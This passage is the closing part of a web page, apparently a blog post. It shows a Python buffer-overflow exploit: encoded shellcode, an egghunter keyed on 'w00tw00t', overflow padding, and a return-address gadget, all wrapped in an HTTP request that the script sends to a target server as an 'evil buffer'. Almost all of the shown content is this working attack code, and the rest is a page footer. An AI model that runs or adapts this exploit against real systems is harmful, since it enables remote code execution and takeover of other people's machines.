</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe3\xd1\x21\x95\x01\x25\xef\x5e\x60\x35\x18</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\x8a\xc5\xd9\xac\x8a\xaf\xdd\x66\xdd\x47</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdc\x5f\x29\xc8\x1f\x8a\x2a\x0f\xdf\x4b\x1a</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7b\xd6\xd9\x22\x13\x17\x0e\xa2\xe3\x41\x44</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa2\x8b\x35\x3c\xf1\xae\x39\xe9\x66\x63\xac</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x12\xde\xd7\x67\x7b\xdc\x0e\x4f\x24\x1f\x65</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd3\x23\xdf\xfb\xfc\x8b\xb7\x03\xbd\x2b\x47</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6e\x3d\x7c\x2f\x65\x12\x73\x9f\x86\xb9\xdc</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb7\x0d\x2c\xae\x26\x11\x65\x6e\xf6\x12\x8a</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xab\x09\x68\xe3\x4c\xea\x8d\xed\x28\xeb\x8d</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x4f\xd0\x5b\x28\x25\x17\x58\x0f\x36\x22</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfd\x26\xdd\x4c\x51\x38\xf4</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> egghunter <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\xb8\x37\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xeb\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> inputBuffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> (size <span style="color:#f92672">-</span> len(egghunter))  
</span></span><span style="display:flex;"><span> inputBuffer<span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, <span style="color:#ae81ff">0x418674</span>) <span style="color:#75715e"># 0x00418674 - pop eax; ret  </span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;w00tw00t&#34;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">400</span><span style="color:#f92672">-</span>len(payload))  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> httpEndRequest <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">=</span> httpMethod <span style="color:#f92672">+</span> egghunter <span style="color:#f92672">+</span> inputBuffer <span style="color:#f92672">+</span> httpEndRequest <span style="color:#f92672">+</span> shellcode  
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)  
</span></span><span style="display:flex;"><span> s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)  
</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>connect((server, port))  
</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>send(buf)  
</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>close()  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Done!&#34;</span>)  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>error:  
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Could not connect!&#34;</span>)
</span></span></code></pre></div></div>
</article>






                    </main><footer>
    <hr />

<p><small>
        2025 &copy; made by jaco with love
    </small></p>
    <p><small>
        Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
